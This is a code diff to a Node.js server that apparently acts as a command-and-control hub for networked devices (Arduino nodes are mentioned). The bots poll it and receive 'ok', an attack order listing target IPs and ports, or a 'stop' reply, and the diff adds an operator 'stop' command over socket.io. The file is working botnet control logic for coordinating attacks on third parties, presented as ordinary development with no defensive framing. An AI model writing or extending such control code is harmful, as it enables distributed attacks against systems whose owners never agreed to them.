@@ -8,6 +8,7 @@ var knownIds = {};
 var ipPortPair = [];
 var targetJson = {};
 var attack = false;
+var stop = false;
 
 app.use(express.static('public'));
 
@@ -56,23 +57,19 @@ app.post("/", function(req, res){
   if(!(knownIds[id])) 
   {
     //Default delay is 1 second
-    knownIds[id] = {time:1000, sent:false};
+    knownIds[id] = {time:1000, sent:false, stop:false};
     //console.log(knownIds);
   } 
   else
   {
-      if(!attack) 
+      if(!attack && !stop) 
       {
           console.log("OK");
           res.end("ok");
       } 
-      else 
+      else //Known host 
       {
-          /*{
-              arduino:[{ip:2.1.3, port:123},...],
-              targets:[{ip:2.1.3, port:123},...]
-            }
-          */
+          //attack order not sent yet
           if(knownIds[id].sent == false)
           {
             var content = {};
@@ -84,9 +81,13 @@ app.post("/", function(req, res){
             res.send(JSON.stringify(content));
             knownIds[id].sent = true;
           }
+          else if(knownIds[id].stop == false)
+          {
+            res.end("stop");
+          }
           else
           {
-            res.end("ok");
+            res.end("ok"); 
           }
       }
     
@@ -202,8 +203,16 @@ io.on('connection', function(socket){
   socket.on('attack', function(targets) {
     targetJson = parseTarget(targets);    
     attack = true;
+    stop = false;
     console.log("Attack order received!");
   });
+
+  socket.on('stop', function() {        
+    console.log("Stop order received!");
+    stop = true;
+    attack = false;
+  });
+
 
 });
 
